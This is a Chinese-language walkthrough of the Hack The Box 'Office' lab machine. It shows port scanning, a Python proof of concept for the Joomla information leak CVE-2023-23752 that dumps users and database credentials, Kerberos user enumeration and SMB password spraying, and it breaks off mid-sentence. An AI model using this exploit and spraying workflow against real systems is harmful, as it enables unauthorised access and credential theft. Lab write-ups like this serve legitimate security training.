---
title: HTB Office实战式打靶过程
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458584063&idx=1&sn=75bec6b3e1c4f392d537756d42829c87&chksm=b18c337586fbba63c81eafc11e032ab59dca248307ce6ce23d9adb44d43f5063631ab8b86c85&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-11-27
fetch_date: 2025-10-06T19:18:15.647108
---

# HTB Office实战式打靶过程

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fVRVVBFgFu9xmUe0f9xic9U48lpMMulrFI4prFKXibMxd4k1oTc2geBtA/0?wx_fmt=jpeg)

# HTB Office实战式打靶过程

压强带师

看雪学苑

## **这是今年2月份的一台域渗透OSCP Like的靶机，难度是困难，这篇文章将记录我这次实战式打靶的过程，我感觉它的总体难度可能已经到达前几年Htb中的疯狂难度的机器，这也是我第一次尝试发布文章，如果你是第一次打这台靶机，我建议你先去盲打一遍，再来看这篇文章。**

## ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5ftsNkRqvgSx0D66yZuf4icpP8ciaao4QuNe8ufRHbVrz9OicXCPVku6p9A/640?wx_fmt=jpeg&from=appmsg)

#### 信息收集

##### 扫描主机端口

```
sudo nmap --min-rate 10000 -p- 10.10.11.3|grep open |awk -F/ '{print $1}'|paste -sd ','
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fDt9rvibNSIe4dppX6wzhltQwfQSa8V4oceOV8ZU3VpocaqdIteOEUTQ/640?wx_fmt=jpeg&from=appmsg)

发现53,88,389,636端口，基本可以确认为域环境。

##### 扫描端口详细信息

```
sudo nmap -sC -sT -sV -O -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389  10.10.11.3
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5f0eJVkiabdlGQjGK3RWpLQkAExT4PIqDDrjxibOee8gmcRuxe04ppichUw/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fAplBZDib7aMIvFwd28EsdobCACG22yiavNgPBkaibP2e9hTTEynyvGGoA/640?wx_fmt=jpeg&from=appmsg)
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fTNlduXchCbQExWaVkQ7QOeaMmpsJGapJgG1cncxUqcMhZDhjcdDwUA/640?wx_fmt=jpeg&from=appmsg)

从扫描信息来看主机域名有两个**dc.office.htb**、**office.htb**,我将这两个域名写入`/etc/hosts`文件当中：

```
sudo bash -c "echo '10.10.11.3 dc.office.htb office.htb' >> /etc/hosts"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5f3ELFiabnYs5zDoiaJKiaIWnWK2xlJs2nfiapvtngVfEK00YrxNjcFYP2Cg/640?wx_fmt=jpeg&from=appmsg)

#####

##### 查看445端口

通过smbclient查看是否能匿名访问smb服务：

```
smbclient  -L  //10.10.11.3/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5f7Axc3ia1YGxodr0NZZRic6AetOZpFibhqnfFC2XuibRlTq7KBONXejOk8g/640?wx_fmt=jpeg&from=appmsg)

拒绝匿名访问，只能将目光投向到80端口了。

##### 查看80端口

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5f8ECZZCicejUbiavib6ygX6830YnLa7aUQoyXmiarLW1YMlf6brF9wnbQ4g/640?wx_fmt=jpeg&from=appmsg)

这是一个关于钢铁侠的网站，我首先查看了一下网站是否有敏感信息泄露，首先我查看了一下`robot.txt`文件，里面罗列一堆目录：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fagKfuVcurYI0iadBbfYDkfQ1H5L5m94E4z8GibTV69d2p42w9PzibtM0A/640?wx_fmt=jpeg&from=appmsg)

里面有几个我比较感兴趣目录，**administrator**和**api**，这几个目录看起来像是一个cms，我将使用`whatweb`验证一下：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5f1OCHj6EXzOnLY9PeOUDe2OGL58ldJhoIWvNQvcvTdxibrPlPgFDBMaw/640?wx_fmt=jpeg&from=appmsg)

果然和我猜想的一样，我使用Google搜索一下这个cms是否存在漏洞可以利用：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fY5fR87F4CYvJaH93nzlb7qV47fiaUdxZ5iabh0mNymzMShN5h3HlA8ZA/640?wx_fmt=jpeg&from=appmsg)

在Hacktricks中找到了有关joomla!的信息，包括版本的探测和存在的利用漏洞，首先我进行版本探测，访问`http://10.10.11.3/administrator/manifests/files/joomla.xml`探测版本：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fwsiaXW2icxZgwntkP9ecL8iaibzsXc4rHhImRxv6UytvI8k9IkNoMp0ajA/640?wx_fmt=jpeg&from=appmsg)

#### CVE-2023-23752

查看到版本是4.27，这个版本在前面Hacktricks提到的未经身份验证的敏感信息泄露影响范围内，这篇文章也详细介绍了这个漏洞，接下来我将复现这个漏洞：

```
curl -v http://10.10.11.3/api/index.php/v1/config/application?public=true
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5floicLDY19Qa3DpY0NdZbhdzOtmVCcicQ8JGmM64MicKdYMaZghaJOV1RA/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5f2icowLeMf4XOujJfTE7icQCVKiaRSicyUMm1nm3Qfza9tpXz0yYVR7TWRA/640?wx_fmt=jpeg&from=appmsg)

一些数据库配置信息以json格式响应给我了。

再测试一下另一个api：

```
curl -v http://10.10.11.3/api/index.php/v1/users?public=true
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fFVhvHRN7cGtak3VJLjg10t9OXZh2XsSiaQxY5lictIQpLibzHdW6Clazw/640?wx_fmt=jpeg&from=appmsg)

同样有效，针对这个漏洞我用python写了一个简单的poc，主要是拿来练手的，让这台靶机有一鱼多吃的效果：

```
import requests
import json
import argparse
from colorama import Fore,Style,init

init(autoreset=True)

def fetch_users(base_url):
    users_api=f"{base_url}/api/index.php/v1/users?public=true"
    response=requests.get(users_api)
    return response.json()

def parse_users(base_url):
    data=fetch_users(base_url)['data']
    users=[]
    for user in data:
        if user['type']=='users':
            user_data=user['attributes']
            users.append({'id':user_data['id'],'name':user_data['name'],
                          'username':user_data['username'],'email':user_data['email']
                          ,'groups':user_data['group_names']})
    return users

def display_users(base_url):
    users=parse_users(base_url)
    print(Fore.RED +Style.BRIGHT+"User_info")
    for user in users:
        print(f"id:{user['id']}\n"
              f"name:{user['name']}\n"
              f"username:{user['username']}\n"
            f"email:{user['email']}\n"
            f"groups:{user['groups']}")

def fetch_config(base_url):
    config_api=f"{base_url}/api/index.php/v1/config/application?public=true"
    response=requests.get(config_api)
    return response.json()

def parse_config(base_url):
    data=fetch_config(base_url)['data']
    configs={}
    for entry in data:
        if entry['type']=="application":
            key=list(entry['attributes'].keys())[0]
            configs[key]=entry['attributes'][key]
    return configs
def display_config(base_url):
    config=parse_config(base_url)
    print(Fore.RED + Style.BRIGHT + "db_info")
    print(f"dbtype: {config['dbtype']}")
    print(f"host: {config['host']}")
    print(f"user: {Fore.YELLOW + Style.BRIGHT + config['user']}")
    print(f"password: {Fore.YELLOW + Style.BRIGHT + config['password']}")
    print(f"db_name: {config['db']}")

def main():
    parser=argparse.ArgumentParser(description="Joomla!<4.28,CVE-2023-23752\nusage:python3 CVE-2023-23752.py -url <base_url>")
    parser.add_argument('-url',help="base_url")
    args=parser.parse_args()
    display_users(args.url)
    print()
    display_config(args.url)

if __name__=="__main__":
    main()
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fKia0vBHcMQ4micczawCva7XFkPrxCy8xrWv7MDvGahg1Gia4pYaG8otiaA/640?wx_fmt=jpeg&from=appmsg)

现在我拿到了数据库凭证`root:H0lOgrams4reTakIng0Ver754!`和网站的用户名`Administrator`，我将使用这个密码和用户名尝试登录网站：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5f0QoDFodxlX2UGUcXN3F0TibgRZX4htPWg0gEX57gfWwU4e4a39zoDvg/640?wx_fmt=jpeg&from=appmsg)

很遗憾不行。

#### 横向移动到Smb

尝试登录管理员界面无果后，我只能将目光放回到445端口，尝试进行密码喷洒，首先我需要进行枚举域环境中的用户，我将使用kerbrute进行枚举：

##### 枚举域用户

```
./kerbrute_linux_386 userenum -d office.htb --dc office.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 50
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fnKkqpuqXu2kycr2wnfA7pOGhWsY8DszAAc9sdM4GzuEdZurVJ69FIA/640?wx_fmt=jpeg&from=appmsg)

#####

##### 密码喷洒

我将用户名放在一个文件内，然后使用crackmapexec进行密码喷洒：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fzr4eO8zoONXy41aiaZfGeMBF60vYlaHicIX6qaZC4pxnZFkwoFN2owVw/640?wx_fmt=jpeg&from=appmsg)

```
crackmapexec smb  10.10.11.3 -u users -p 'H0lOgrams4reTakIng0Ver754!'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fj2g8kaJYibIsCTvh7cibiaibspgiazzK7LV6lmKPpV9icbCUo7MR4kUYqg7g/640?wx_fmt=jpeg&from=appmsg)

发现用户`dwolfe`的密码和数据库密码一样。

##### 探测smb共享文件的内容

我将使用这个凭据查看共享的内容：

```
crackmapexec smb  10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HdGonls53t1vVzOPbheS5fwY1QbI3IibartYfrQHprQXelKUEoZ77s97iaibn31ic1c5Kp6L3STXDKFQ/640?wx_fmt=png&from=appmsg)

这里有四个文件夹当前用户可读，但我只关心`SOC Analysis`这个文件夹，因为它不是常规的smb共享文件夹，我将访问这个文件夹的内容：

```
smbclient    //10.10.11.3/"SOC Analysis" -U dwolfe --password 'H0lOgrams4reTakIng0Ver754!'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdGonls53t1vVzOPbheS5fQSoq3FZnzUdib9G4GbpPlnj6gKA4IWicBqfBtKbOqhJWibSvIpFJNG1fg/640?wx_fmt=jpeg&from=appmsg)

只有一个pcap文件，那么方向很明确了，我将...